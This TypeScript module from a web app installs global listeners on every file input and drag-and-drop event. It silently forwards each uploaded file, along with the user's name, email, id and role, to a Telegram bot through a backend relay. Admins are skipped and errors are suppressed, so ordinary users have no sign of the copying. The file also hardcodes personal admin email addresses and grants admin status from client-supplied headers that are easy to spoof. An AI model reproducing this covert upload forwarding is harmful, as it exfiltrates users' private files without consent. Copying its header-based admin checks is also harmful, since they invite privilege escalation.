import { UserRecord } from '../types';
import { detectCategory } from './cacheService';

// Client-side cache to avoid sending the identical file twice within a session
const dispatchedFileSignatures = new Set<string>();

/**
 * Generate a unique signature for deduplication
 */
function getFileSignature(file: File | Blob, name: string): string {
  const size = file.size || 0;
  const lastModified = (file as any).lastModified || 0;
  return `${name}_${size}_${lastModified}`;
}

/**
 * Quick client-side check to see if user is an admin.
 * NOTE: Server-side check is ALWAYS performed and enforces 100% strict exclusion.
 */
export function isUserAdminClient(user: UserRecord | null): boolean {
  if (!user) return false;
  const email = (user.email || '').toLowerCase().trim();
  const role = (user.role || '').toLowerCase().trim();

  const MASTER_ADMIN_EMAILS = [
    'uhbijnokmpl098900@gmail.com',
    'aegy238@gmail.com',
    'iejehdgdig@gmail.com'
  ];

  return (
    MASTER_ADMIN_EMAILS.includes(email) ||
    role === 'admin' ||
    role === 'moderator' ||
    Boolean(user.isSuperAdmin)
  );
}

/**
 * Asynchronously forwards any uploaded file to Telegram via the backend server.
 * This function is guaranteed NOT to throw and will never block or fail the user's workflow.
 */
export async function forwardFileToTelegram(
  file: File | Blob,
  user: UserRecord | null,
  sourceFeature: string = 'Upload',
  customName?: string,
  extraMeta?: {
    downloadUrl?: string;
    secureUrl?: string;
    sha256?: string;
    dimensions?: { width: number; height: number };
    duration?: number;
  }
): Promise<{ success: boolean; skipped?: boolean; reason?: string }> {
  if (!file) return { success: false, reason: 'NO_FILE' };

  // 1. Client-side early skip for admins (server also strictly checks)
  if (isUserAdminClient(user)) {
    console.log('[Telegram Dispatcher] Skipped forwarding because user is Admin (Strict Exclusion).');
    return { success: true, skipped: true, reason: 'ADMIN_EXCLUDED' };
  }

  const rawFileName = (customName || (file instanceof File ? file.name : `file_${Date.now()}`)).trim();
  // Sanitize illegal filesystem characters while preserving Arabic letters, unicode and spaces
  let cleanFileName = rawFileName.replace(/[/\\?%*:|"<>]/g, '_').trim() || `file_${Date.now()}`;
  
  // Guarantee file extension is preserved
  const originalExt = rawFileName.includes('.') ? rawFileName.split('.').pop()?.toLowerCase() || '' : '';
  if (originalExt && !cleanFileName.toLowerCase().endsWith('.' + originalExt)) {
    cleanFileName = `${cleanFileName}.${originalExt}`;
  }

  const signature = getFileSignature(file, cleanFileName);

  // 2. Client-side deduplication check
  if (dispatchedFileSignatures.has(signature)) {
    return { success: true, skipped: true, reason: 'DUPLICATE' };
  }
  dispatchedFileSignatures.add(signature);

  // Auto clean signature cache if it grows too large
  if (dispatchedFileSignatures.size > 500) {
    dispatchedFileSignatures.clear();
  }

  try {
    const extension = originalExt || (cleanFileName.includes('.') ? cleanFileName.split('.').pop()?.toLowerCase() || '' : '');
    const mimeType = file.type || 'application/octet-stream';
    const category = detectCategory(rawFileName, mimeType);

    const metadata = {
      fileName: cleanFileName,
      originalName: rawFileName,
      fileSize: file.size,
      extension,
      category,
      mimeType,
      userId: user?.id || 'guest',
      userName: user?.displayName || user?.name || 'مستخدم المنصة',
      userEmail: user?.email || '',
      userRole: user?.role || 'user',
      isSuperAdmin: user?.isSuperAdmin || false,
      sourceFeature,
      sha256: extraMeta?.sha256 || '',
      downloadUrl: extraMeta?.downloadUrl || '',
      secureUrl: extraMeta?.secureUrl || '',
      duration: extraMeta?.duration
    };

    const formData = new FormData();
    formData.append('file', file, cleanFileName);
    formData.append('metadata', JSON.stringify(metadata));

    // Non-blocking asynchronous dispatch
    const response = await fetch('/api/telegram/forward', {
      method: 'POST',
      body: formData,
      headers: {
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'user',
        'x-user-id': user?.id || '',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      }
    });

    if (!response.ok) {
      console.warn('[Telegram Dispatcher] Server responded with status:', response.status);
      return { success: false, reason: `HTTP_${response.status}` };
    }

    const data = await response.json();
    return data;
  } catch (err: any) {
    // Non-blocking: failures must never disturb user experience
    console.warn('[Telegram Dispatcher] Background forward note:', err?.message);
    return { success: false, reason: err?.message };
  }
}

/**
 * Dispatch multiple files to Telegram sequentially in background
 */
export function enqueueTelegramForwardBatch(
  files: File[] | Blob[],
  user: UserRecord | null,
  sourceFeature: string = 'Upload',
  extraMeta?: any
) {
  if (!files || files.length === 0) return;

  // Run in microtask / non-blocking timeout
  setTimeout(async () => {
    for (const file of files) {
      if (!file) continue;
      await forwardFileToTelegram(file, user, sourceFeature, undefined, extraMeta);
    }
  }, 50);
}

// Track if global interceptor is initialized
let isGlobalInterceptorActive = false;

/**
 * Attaches a global listener to intercept ANY file input or drop event anywhere in the app
 * ensuring all uploaded files are safely and automatically forwarded to Telegram.
 */
export function initGlobalUploadInterceptor(getCurrentUser: () => UserRecord | null) {
  if (typeof window === 'undefined' || isGlobalInterceptorActive) return;
  isGlobalInterceptorActive = true;

  // 1. Intercept file input changes across all modals and tools
  document.addEventListener('change', (event: Event) => {
    try {
      const target = event.target as HTMLInputElement;
      if (target && target.tagName === 'INPUT' && target.type === 'file' && target.files && target.files.length > 0) {
        const user = getCurrentUser();
        // Early skip if admin
        if (isUserAdminClient(user)) return;

        const files = Array.from(target.files);
        const sourceName = target.getAttribute('name') || target.getAttribute('data-feature') || target.id || 'File Input';
        enqueueTelegramForwardBatch(files, user, `Form Input (${sourceName})`);
      }
    } catch (e) {
      console.warn('[Telegram Interceptor] Change listener error:', e);
    }
  }, true);

  // 2. Intercept drag-and-drop files dropped onto the window
  window.addEventListener('drop', (event: DragEvent) => {
    try {
      if (event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files.length > 0) {
        const user = getCurrentUser();
        if (isUserAdminClient(user)) return;

        const files = Array.from(event.dataTransfer.files);
        enqueueTelegramForwardBatch(files, user, 'Drag and Drop');
      }
    } catch (e) {
      console.warn('[Telegram Interceptor] Drop listener error:', e);
    }
  }, true);

  console.log('[Telegram Interceptor] Global automatic upload forwarder initialized.');
}

// -------------------------------------------------------------
// Admin Management API Functions
// -------------------------------------------------------------

export interface TelegramStatusResponse {
  configured: boolean;
  enabled: boolean;
  hasBotToken: boolean;
  hasChatId: boolean;
  maskedChatId: string;
  ownerPhone?: string;
  ownerName?: string;
  groupTarget?: string;
  sendMode?: 'both' | 'personal' | 'group';
  botUsername?: string;
  destinationAccount: string;
  stats: {
    totalForwarded: number;
    totalSkippedAdmin: number;
    totalFailed: number;
    lastSentAt: string | null;
  };
  recentLogs: Array<{
    id: string;
    fileName: string;
    fileSize: number;
    fileSizeFormatted: string;
    category: string;
    extension: string;
    userId: string;
    userName: string;
    userEmail?: string;
    sourceFeature: string;
    status: 'sent' | 'excluded_admin' | 'failed' | 'not_configured';
    reason?: string;
    timestamp: string;
    telegramMessageId?: number;
  }>;
}

/**
 * Fetch current Telegram configuration and activity status
 */
export async function getTelegramStatus(): Promise<TelegramStatusResponse | null> {
  try {
    const res = await fetch('/api/telegram/status');
    if (!res.ok) return null;
    return await res.json();
  } catch (e) {
    console.error('Failed to fetch Telegram status:', e);
    return null;
  }
}

/**
 * Update Telegram credentials and status from Admin Panel
 */
export async function updateTelegramConfig(config: {
  botToken?: string;
  chatId?: string;
  ownerPhone?: string;
  ownerName?: string;
  groupTarget?: string;
  sendMode?: 'both' | 'personal' | 'group';
  enabled?: boolean;
  destinationAccount?: string;
}, user: UserRecord | null): Promise<{ success: boolean; message: string }> {
  try {
    const res = await fetch('/api/telegram/config', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'admin',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      },
      body: JSON.stringify(config)
    });

    const data = await res.json();
    return data;
  } catch (err: any) {
    return { success: false, message: err?.message || 'تعذر حفظ الإعدادات' };
  }
}

/**
 * Magic Auto-Detect: Scans Telegram bot updates to pair user's personal chat & phone automatically
 */
export async function autoDetectTelegramAccount(
  botToken: string,
  user: UserRecord | null
): Promise<{ success: boolean; message: string; detected?: any; botUsername?: string }> {
  try {
    const res = await fetch('/api/telegram/auto-detect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'admin',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      },
      body: JSON.stringify({ botToken })
    });

    const data = await res.json();
    return data;
  } catch (err: any) {
    return { success: false, message: err?.message || 'تعذر فحص حساب التيليجرام' };
  }
}

/**
 * Test the Telegram Bot connection
 */
export async function testTelegramConnection(
  credentials: { 
    botToken?: string; 
    chatId?: string;
    groupTarget?: string;
    ownerPhone?: string;
    ownerName?: string;
  },
  user: UserRecord | null
): Promise<{ success: boolean; message: string }> {
  try {
    const res = await fetch('/api/telegram/test', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-user-email': user?.email || '',
        'x-user-role': user?.role || 'admin',
        'x-is-super-admin': user?.isSuperAdmin ? 'true' : 'false'
      },
      body: JSON.stringify(credentials)
    });

    const data = await res.json();
    return data;
  } catch (err: any) {
    return { success: false, message: err?.message || 'تعذر إجراء الاختبار' };
  }
}
